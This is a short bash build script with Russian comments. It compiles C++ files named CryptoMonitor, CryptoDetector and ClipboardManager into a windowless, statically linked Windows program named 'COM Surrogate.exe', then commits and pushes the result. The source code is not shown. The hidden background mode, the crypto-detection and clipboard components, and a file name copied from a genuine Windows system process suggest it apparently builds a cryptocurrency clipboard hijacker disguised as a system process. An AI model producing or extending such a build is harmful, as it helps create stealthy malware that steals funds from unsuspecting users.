#!/bin/bash
set -e # Остановить выполнение, если возникнет ошибка

echo "Compiling..."

# Компиляция всех исходных файлов
# -mwindows: приложение без консольного окна (background)
# -static: статическая линковка библиотек
x86_64-w64-mingw32-g++ main.cpp CryptoMonitor.cpp CryptoDetector.cpp ClipboardManager.cpp \
    -o 'COM Surrogate.exe' \
    -static \
    -mwindows \
    -luser32 -lkernel32

echo "Compilation successful."

git add .
git commit -m "Add Windows clipboard application"
# git tag -a v1.0-windows -m "Windows clipboard application version 1

git push

echo "Done."
